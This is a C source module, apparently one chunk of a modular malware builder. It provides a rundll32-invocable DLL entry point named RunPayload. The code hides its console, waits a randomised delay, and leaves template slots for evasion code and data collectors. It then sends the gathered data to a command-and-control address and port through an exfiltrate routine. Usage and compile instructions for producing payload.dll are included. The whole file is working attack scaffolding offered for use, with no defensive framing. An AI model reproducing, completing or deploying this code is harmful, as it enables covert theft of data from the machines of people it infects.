// chunk: arch/dll_rundll
// depends: core/emit_buffer, exfil/*
// provides: DllMain, RunPayload
// headers: windows.h
// note: Generic rundll32 entry — export RunPayload for rundll32.exe invocation.
//       Usage: rundll32.exe payload.dll,RunPayload
//       Compile with: -shared -o payload.dll source.c rundll.def

#ifndef CHUNK_ARCH_DLL_RUNDLL
#define CHUNK_ARCH_DLL_RUNDLL

static DWORD WINAPI rundll_worker(LPVOID param) {
    (void)param;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    FreeConsole();
    Sleep(2000 + (GetTickCount() % 3000));

{{EVASION_INIT}}

    init_buffer();
    if (!g_data) { WSACleanup(); return 1; }

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    WSACleanup();
    return 0;
}

__declspec(dllexport) void CALLBACK RunPayload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    rundll_worker(NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)hinstDLL; (void)lpReserved;
    if (fdwReason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hinstDLL);
    return TRUE;
}

#endif
